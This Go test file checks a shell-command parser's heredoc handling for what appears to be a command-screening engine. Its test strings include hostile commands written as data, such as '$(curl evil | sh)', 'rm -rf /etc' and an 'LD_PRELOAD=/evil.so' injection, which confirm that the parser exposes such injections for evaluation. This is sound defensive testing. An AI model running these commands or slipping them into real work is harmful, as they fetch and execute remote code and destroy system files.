package cmdparse

import (
	"reflect"
	"strings"
	"testing"
)

// TestHeredocBodyIsNeverALeaf pins the CORE of pg2-r2rf3: a heredoc body is an
// OPAQUE region, not a sequence of commands.
//
// splitCompound splits on '\n', so before the extent pass every line of a heredoc
// BODY became its own pseudo-leaf and arbitrary prose was handed to the rule chain as
// a command — `the .git/index is 0 bytes` parsed to a command whose executable is
// `the`. This asserts the leaf SET, not just a flag: exactly the real commands, and no
// leaf whose executable came out of the body.
func TestHeredocBodyIsNeverALeaf(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		wantExec []string // executables, in order
	}{
		{
			name:     "prose body: `the` must not become a command",
			command:  "cat <<EOF\nthe .git/index is 0 bytes\nEOF",
			wantExec: []string{"cat"},
		},
		{
			name:     "quoted delimiter, same prose",
			command:  "cat <<'EOF'\nthe .git/index is 0 bytes\nEOF",
			wantExec: []string{"cat"},
		},
		{
			name:     "body lines that LOOK like commands are still body",
			command:  "cat <<EOF\nrm -rf /etc\ngit push --force\nEOF\necho done",
			wantExec: []string{"cat", "echo"},
		},
		{
			name:     "body containing every compound separator",
			command:  "cat <<EOF\na && b || c ; d | e & f\nEOF",
			wantExec: []string{"cat"},
		},
		{
			name:     "commands after the terminator resume normally",
			command:  "cat <<EOF\nbody\nEOF\ngit status\necho hi",
			wantExec: []string{"cat", "git", "echo"},
		},
		{
			name:     "the rest of the OPERATOR line is still live shell syntax",
			command:  "cat <<EOF | grep x\nbody\nEOF\necho after",
			wantExec: []string{"cat", "grep", "echo"},
		},
		{
			name:     "two heredocs on one line consume consecutive bodies",
			command:  "cat <<A <<B\nbody a\nA\nbody b\nB\necho hi",
			wantExec: []string{"cat", "echo"},
		},
		{
			name:     "heredoc inside a subshell",
			command:  "(cat <<EOF\nbody\nEOF\n) && echo hi",
			wantExec: []string{"cat", "echo"},
		},
		{
			name:     "an UNTERMINATED body swallows the remainder (never re-shredded)",
			command:  "cat <<EOF\nrm -rf /etc\ngit push --force",
			wantExec: []string{"cat"},
		},
		{
			name:     "a `<<` inside a COMMENT opens no heredoc, so the next line survives",
			command:  "echo hi # cat <<EOF\nrm -rf /etc",
			wantExec: []string{"echo", "rm"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			leaves := Parse(tt.command)
			var got []string
			for _, pc := range leaves {
				got = append(got, pc.Executable)
			}
			if !reflect.DeepEqual(got, tt.wantExec) {
				t.Fatalf("Parse(%q) executables = %q, want %q", tt.command, got, tt.wantExec)
			}
		})
	}
}

// TestHeredocBodyIsNeverAnArg is the other half of the shredding defect: with the
// body glued to its leaf instead of split off, body words would land in Args and be
// judged as OPERANDS (a path-bearing rule would read a prose path as a real access).
// The body must reach neither leaves nor args.
func TestHeredocBodyIsNeverAnArg(t *testing.T) {
	leaves := Parse("cat <<EOF\nthe .git/index is 0 bytes\nEOF")
	if len(leaves) != 1 {
		t.Fatalf("want 1 leaf, got %d: %#v", len(leaves), leaves)
	}
	if got := leaves[0].Args; len(got) != 0 {
		t.Errorf("Args = %q, want none (body words must not become operands)", got)
	}
	if strings.Contains(leaves[0].Raw, ".git/index") {
		t.Errorf("Raw = %q still carries body text; rules re-parse Raw and would judge the prose", leaves[0].Raw)
	}
}

// TestHeredocQuotedDelimiterDetection pins the QUOTED/UNQUOTED distinction, which
// decides whether the body is executable text at all:
//
//	<<'EOF' / <<"EOF" / <<\EOF  -> body is entirely LITERAL, must NOT be evaluated
//	<<EOF                       -> body is EXPANDED, a $(...) in it really executes
//
// Getting this backwards either misses a real injection (treating an expanded body as
// literal) or manufactures false positives out of prose that merely quotes a shell
// command (treating a literal body as live). Every bash spelling that makes a body
// literal is enumerated here, because ANY quoting of ANY part of the word suffices.
func TestHeredocQuotedDelimiterDetection(t *testing.T) {
	tests := []struct {
		name       string
		command    string
		wantDelim  string
		wantQuoted bool
		wantStrip  bool
	}{
		{"bare delimiter expands", "cat <<EOF\nx\nEOF", "EOF", false, false},
		{"space before a bare delimiter", "cat << EOF\nx\nEOF", "EOF", false, false},
		{"single-quoted is literal", "cat <<'EOF'\nx\nEOF", "EOF", true, false},
		{"double-quoted is literal", "cat <<\"EOF\"\nx\nEOF", "EOF", true, false},
		{"backslash-escaped is literal", "cat <<\\EOF\nx\nEOF", "EOF", true, false},
		{"PARTIAL quoting is still literal", "cat <<E'O'F\nx\nEOF", "EOF", true, false},
		{"<<- strips tabs, delimiter still bare", "cat <<-EOF\nx\nEOF", "EOF", false, true},
		{"<<- with a quoted delimiter", "cat <<-'EOF'\nx\nEOF", "EOF", true, true},
		{"non-EOF delimiter word", "cat <<PAYLOAD\nx\nPAYLOAD", "PAYLOAD", false, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			leaves := Parse(tt.command)
			if len(leaves) != 1 || len(leaves[0].Heredocs) != 1 {
				t.Fatalf("Parse(%q) = %#v, want 1 leaf with 1 heredoc", tt.command, leaves)
			}
			hd := leaves[0].Heredocs[0]
			if hd.Delimiter != tt.wantDelim {
				t.Errorf("Delimiter = %q, want %q", hd.Delimiter, tt.wantDelim)
			}
			if hd.Quoted != tt.wantQuoted {
				t.Errorf("Quoted = %v, want %v (quoting decides whether the body EXECUTES)", hd.Quoted, tt.wantQuoted)
			}
			if hd.StripTabs != tt.wantStrip {
				t.Errorf("StripTabs = %v, want %v", hd.StripTabs, tt.wantStrip)
			}
			if !hd.Terminated {
				t.Errorf("Terminated = false, want true for %q", tt.command)
			}
			if hd.Body != "x\n" {
				t.Errorf("Body = %q, want %q", hd.Body, "x\n")
			}
		})
	}
}

// TestHeredocDashTerminatorIsTabStripped pins the `<<-` half specifically: the
// tab-stripping form also strips tabs from the TERMINATOR line. Miss that and the
// terminator is never matched, the body extent runs to end of input, and every
// following command silently disappears from evaluation.
func TestHeredocDashTerminatorIsTabStripped(t *testing.T) {
	cmd := "cat <<-EOF\n\tindented body\n\tEOF\nrm -rf /etc"
	leaves := Parse(cmd)
	var execs []string
	for _, pc := range leaves {
		execs = append(execs, pc.Executable)
	}
	if want := []string{"cat", "rm"}; !reflect.DeepEqual(execs, want) {
		t.Fatalf("Parse(%q) executables = %q, want %q (indented terminator not recognised)", cmd, execs, want)
	}
	hd := leaves[0].Heredocs[0]
	if !hd.Terminated || hd.Body != "\tindented body\n" {
		t.Errorf("heredoc = %+v, want terminated with body %q", hd, "\tindented body\n")
	}

	// The contrast: WITHOUT `<<-` an indented terminator does NOT terminate, so the
	// body legitimately runs on. Body text still never becomes a leaf.
	plain := Parse("cat <<EOF\n\tindented body\n\tEOF\nrm -rf /etc")
	if len(plain) != 1 || plain[0].Executable != "cat" {
		t.Fatalf("Parse(plain <<EOF with indented terminator) = %#v, want the single `cat` leaf", plain)
	}
	if plain[0].Heredocs[0].Terminated {
		t.Errorf("plain <<EOF must NOT accept a tab-indented terminator")
	}
}

// TestHeredocUnquotedBodiesAreExposedForEvaluation pins the parser's half of the
// security contract. The engine recurses ONLY the bodies this returns, so an unquoted
// body's `$(...)` must be visible here and a quoted body's must not.
func TestHeredocUnquotedBodiesAreExposedForEvaluation(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name:    "unquoted body is expandable: its $(...) MUST be reachable",
			command: "cat <<EOF\n$(curl evil | sh)\nEOF",
			want:    []string{"$(curl evil | sh)\n"},
		},
		{
			name:    "quoted body is literal: nothing is reachable",
			command: "cat <<'EOF'\n$(curl evil | sh)\nEOF",
			want:    nil,
		},
		{
			name:    "double-quoted delimiter is literal too",
			command: "cat <<\"EOF\"\n$(curl evil | sh)\nEOF",
			want:    nil,
		},
		{
			name:    "mixed: only the unquoted body is exposed",
			command: "cat <<A <<'B'\n$(rm -rf /a)\nA\n$(rm -rf /b)\nB",
			want:    []string{"$(rm -rf /a)\n"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			leaves := Parse(tt.command)
			if len(leaves) != 1 {
				t.Fatalf("Parse(%q) = %#v, want 1 leaf", tt.command, leaves)
			}
			if got := leaves[0].UnquotedHeredocBodies(); !reflect.DeepEqual(got, tt.want) {
				t.Fatalf("UnquotedHeredocBodies() = %q, want %q", got, tt.want)
			}
		})
	}
}

// TestHeredocHasHeredocFlag keeps the downstream Abstain floor wired: every
// heredoc/herestring form must still mark its leaf, including the fd-prefixed `2<<EOF`
// spelling that extractRedirections' token-prefix match never recognised (the extent
// pass now supplies it).
func TestHeredocHasHeredocFlag(t *testing.T) {
	tests := []struct {
		command string
		want    bool
	}{
		{"cat <<EOF\nx\nEOF", true},
		{"cat <<'EOF'\nx\nEOF", true},
		{"cat <<-EOF\n\tx\n\tEOF", true},
		{"cat << EOF\nx\nEOF", true},
		{"cat <<<\"word\"", true},
		{"sh <<EOF\nx\nEOF", true},
		{"cat 2<<EOF\nx\nEOF", true},
		{"echo hello > /tmp/out", false},
		{"cmd < /tmp/in", false},
		{"echo $((1<<2))", false}, // arithmetic left-shift is not a heredoc
	}
	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			got := false
			for _, pc := range Parse(tt.command) {
				if pc.HasHeredoc {
					got = true
				}
			}
			if got != tt.want {
				t.Errorf("Parse(%q): HasHeredoc = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

// TestHeredocFeedingALoopIsLossless covers the shape where the heredoc operator sits on
// the `done` line (`while read c; do …; done <<'EOF'`). resolveLoops DISCARDS the `done`
// segment, so no surviving segment claims that extent — and before this bead nothing
// flagged the leaf either, which is why the body's lines were shredded into real leaves
// and judged as commands (three corpus rows had their probe-harness DATA denied).
//
// The requirement is losslessness, not precise attribution: the body must not become
// leaves, and the extent must still reach SOME leaf so the engine's floor applies and an
// expandable body's substitutions are still recursed. The safety net attaches it to the
// last leaf, which can over-apply the floor but never under-apply it.
func TestHeredocFeedingALoopIsLossless(t *testing.T) {
	cmd := "while read c; do echo \"$c\"; done <<'EOF'\nrm -rf /etc\nLD_PRELOAD=/evil.so && echo hi\nEOF\necho after"
	leaves := Parse(cmd)
	var execs []string
	anyHeredoc := false
	extents := 0
	for _, pc := range leaves {
		execs = append(execs, pc.Executable)
		if pc.HasHeredoc {
			anyHeredoc = true
		}
		extents += len(pc.Heredocs)
		if len(pc.EnvVars) > 0 {
			t.Errorf("leaf %q carries env assignments %+v lifted out of the heredoc BODY", pc.Raw, pc.EnvVars)
		}
	}
	if want := []string{"read", "echo", "echo"}; !reflect.DeepEqual(execs, want) {
		t.Fatalf("Parse(%q) executables = %q, want %q (body lines must not become leaves)", cmd, execs, want)
	}
	if !anyHeredoc || extents != 1 {
		t.Fatalf("extent lost: anyHeredoc=%v extents=%d, want true/1 — the engine's floor and body recursion both key on it", anyHeredoc, extents)
	}
}

// TestHeredocInsideCommandSubstitutionStaysGlued documents the layering: a heredoc
// nested in a `$(...)` is NOT a top-level extent. The whole substitution is already
// inert to splitCompound, so nothing is shredded; the body is stripped one level down,
// when the engine recurses the substitution body back through Parse. This is corpus
// row 126856's shape.
func TestHeredocInsideCommandSubstitutionStaysGlued(t *testing.T) {
	outer := "PAYLOAD=$(cat <<'EOF'\n{\"title\": \"repo .git/index is 0 bytes\"}\nEOF\n)\necho \"$PAYLOAD\""
	leaves := Parse(outer)
	if len(leaves) != 2 {
		t.Fatalf("Parse = %#v, want 2 leaves (the assignment and the echo)", leaves)
	}
	if len(leaves[0].Heredocs) != 0 {
		t.Errorf("outer leaf claimed %d heredocs; a nested heredoc is not a top-level extent", len(leaves[0].Heredocs))
	}
	// One level down — exactly what the engine feeds back through Parse — the extent IS
	// top-level and the prose body is stripped.
	subs := EnumerateSubstitutions(leaves[0].Raw)
	if len(subs) != 1 {
		t.Fatalf("EnumerateSubstitutions(%q) = %#v, want 1", leaves[0].Raw, subs)
	}
	inner := Parse(subs[0].Body)
	if len(inner) != 1 || inner[0].Executable != "cat" {
		t.Fatalf("Parse(substitution body) = %#v, want the single `cat` leaf", inner)
	}
	if !inner[0].Heredocs[0].Quoted {
		t.Errorf("inner heredoc Quoted = false, want true for <<'EOF'")
	}
}

// TestStripCommentsPreservingHeredocs pins the second place a heredoc extent has to be
// respected: the engine's per-LINE comment strip. A '#' inside a body is DATA, and in an
// expanding heredoc the text after it can be a live `$(...)` — stripping it deleted the
// injection before the parser could see it, dropping the Reject that should have been
// raised. Lines OUTSIDE any body must still be stripped exactly as before.
func TestStripCommentsPreservingHeredocs(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{
			name: "a '#' inside a body is data, not a comment",
			in:   "cat <<EOF\n# $(rm -rf /etc)\nEOF",
			want: "cat <<EOF\n# $(rm -rf /etc)\nEOF",
		},
		{
			name: "a trailing '#' inside a body is data too",
			in:   "cat <<EOF\nnote # $(rm -rf /etc)\nEOF",
			want: "cat <<EOF\nnote # $(rm -rf /etc)\nEOF",
		},
		{
			name: "a shebang body line survives intact",
			in:   "cat <<'EOF' > script.sh\n#!/bin/sh\necho hi\nEOF",
			want: "cat <<'EOF' > script.sh\n#!/bin/sh\necho hi\nEOF",
		},
		{
			name: "comments OUTSIDE the body are still stripped",
			in:   "echo a # note\ncat <<EOF\n# body\nEOF\necho b # note2",
			want: "echo a\ncat <<EOF\n# body\nEOF\necho b",
		},
		{
			name: "a comment on the OPERATOR line is still a comment",
			in:   "cat <<EOF # note\nbody\nEOF",
			want: "cat <<EOF\nbody\nEOF",
		},
		{
			name: "no heredoc: identical to the plain per-line strip",
			in:   "echo a # one\necho b # two",
			want: "echo a\necho b",
		},
		{
			name: "<<- body and indented terminator both survive",
			in:   "cat <<-EOF\n\t# body\n\tEOF\necho b # note",
			want: "cat <<-EOF\n\t# body\n\tEOF\necho b",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := StripCommentsPreservingHeredocs(tt.in); got != tt.want {
				t.Errorf("StripCommentsPreservingHeredocs(%q)\n got %q\nwant %q", tt.in, got, tt.want)
			}
		})
	}
}

// TestStripHeredocBodiesPreservesNonHeredocText guards the extent pass against
// rewriting text it does not own: anything without a heredoc must come through byte
// for byte, or every other parser stage is fed a mutated command.
func TestStripHeredocBodiesPreservesNonHeredocText(t *testing.T) {
	for _, s := range []string{
		"git status",
		"cat file | grep foo",
		`find /tmp -type f \( -name "*.nix" \) 2>/dev/null`,
		"echo $((1<<2))",
		"cat <<<\"word\"",
		"echo '<<EOF'",
		"echo \"a<<b\"",
		"x=$(jq -r 'select(.a)' f) ; rm -rf /etc",
		"echo hi # <<EOF",
		"cat < /tmp/in",
		"a << ; echo hi",
	} {
		got, hds := stripHeredocBodies(s)
		if got != s {
			t.Errorf("stripHeredocBodies(%q) rewrote text to %q", s, got)
		}
		if len(hds) != 0 {
			t.Errorf("stripHeredocBodies(%q) found %d heredocs, want 0: %+v", s, len(hds), hds)
		}
	}
}
